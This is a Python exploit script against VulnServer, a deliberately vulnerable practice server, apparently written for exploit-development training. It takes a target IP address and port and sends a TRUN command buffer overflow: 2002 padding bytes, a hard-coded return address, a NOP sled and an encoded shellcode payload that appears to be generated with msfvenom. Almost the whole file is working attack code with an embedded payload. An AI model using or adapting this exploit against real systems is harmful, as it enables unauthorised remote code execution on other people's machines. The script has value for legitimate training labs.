#!/usr/bin/python3 

import sys,socket
import time

print("*****VulnServer*****")
ip_address=input("Enter the IP address:\n")
port=input("Enter the port number:\n")


if (len(ip_address)==0) or (len(port)==0):
    if (len(ip_address)>0) and (len(port)==0):
        print("*"*40)
        print("Port number field is empty")
    elif (len(ip_address)==0) and (len(port)>0):
        print("*"*40)
        print("IP address field is empty")
    elif (len(ip_address)==0) and (len(port)==0):
        print("*"*40)
        print("IP address field is empty")
        print("Port number field is empty")
    else:
        print("*"*40)
        print("Issues with the user input")

elif (len(ip_address)>0) and (len(port)>0):
    buf =  b""
    buf += b"\xda\xd5\xd9\x74\x24\xf4\x58\xbe\x91\xa1\x46\x7e"
    buf += b"\x29\xc9\xb1\x52\x31\x70\x17\x03\x70\x17\x83\x51"
    buf += b"\xa5\xa4\x8b\xad\x4e\xaa\x74\x4d\x8f\xcb\xfd\xa8"
    buf += b"\xbe\xcb\x9a\xb9\x91\xfb\xe9\xef\x1d\x77\xbf\x1b"
    buf += b"\x95\xf5\x68\x2c\x1e\xb3\x4e\x03\x9f\xe8\xb3\x02"
    buf += b"\x23\xf3\xe7\xe4\x1a\x3c\xfa\xe5\x5b\x21\xf7\xb7"
    buf += b"\x34\x2d\xaa\x27\x30\x7b\x77\xcc\x0a\x6d\xff\x31"
    buf += b"\xda\x8c\x2e\xe4\x50\xd7\xf0\x07\xb4\x63\xb9\x1f"
    buf += b"\xd9\x4e\x73\x94\x29\x24\x82\x7c\x60\xc5\x29\x41"
    buf += b"\x4c\x34\x33\x86\x6b\xa7\x46\xfe\x8f\x5a\x51\xc5"
    buf += b"\xf2\x80\xd4\xdd\x55\x42\x4e\x39\x67\x87\x09\xca"
    buf += b"\x6b\x6c\x5d\x94\x6f\x73\xb2\xaf\x94\xf8\x35\x7f"
    buf += b"\x1d\xba\x11\x5b\x45\x18\x3b\xfa\x23\xcf\x44\x1c"
    buf += b"\x8c\xb0\xe0\x57\x21\xa4\x98\x3a\x2e\x09\x91\xc4"
    buf += b"\xae\x05\xa2\xb7\x9c\x8a\x18\x5f\xad\x43\x87\x98"
    buf += b"\xd2\x79\x7f\x36\x2d\x82\x80\x1f\xea\xd6\xd0\x37"
    buf += b"\xdb\x56\xbb\xc7\xe4\x82\x6c\x97\x4a\x7d\xcd\x47"
    buf += b"\x2b\x2d\xa5\x8d\xa4\x12\xd5\xae\x6e\x3b\x7c\x55"
    buf += b"\xf9\x84\x29\x31\x1f\x6c\x28\xb9\xc0\xfd\xa5\x5f"
    buf += b"\x94\xed\xe3\xc8\x01\x97\xa9\x82\xb0\x58\x64\xef"
    buf += b"\xf3\xd3\x8b\x10\xbd\x13\xe1\x02\x2a\xd4\xbc\x78"
    buf += b"\xfd\xeb\x6a\x14\x61\x79\xf1\xe4\xec\x62\xae\xb3"
    buf += b"\xb9\x55\xa7\x51\x54\xcf\x11\x47\xa5\x89\x5a\xc3"
    buf += b"\x72\x6a\x64\xca\xf7\xd6\x42\xdc\xc1\xd7\xce\x88"
    buf += b"\x9d\x81\x98\x66\x58\x78\x6b\xd0\x32\xd7\x25\xb4"
    buf += b"\xc3\x1b\xf6\xc2\xcb\x71\x80\x2a\x7d\x2c\xd5\x55"
    buf += b"\xb2\xb8\xd1\x2e\xae\x58\x1d\xe5\x6a\x78\xfc\x2f"
    buf += b"\x87\x11\x59\xba\x2a\x7c\x5a\x11\x68\x79\xd9\x93"
    buf += b"\x11\x7e\xc1\xd6\x14\x3a\x45\x0b\x65\x53\x20\x2b"
    buf += b"\xda\x54\x61"

    buffer=b"A"*2002 + b"\xAF\x11\x50\x62" + b"\x90" * 16 + buf 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address,int(port)))
    s.send(b"TRUN /.:/ " + buffer)
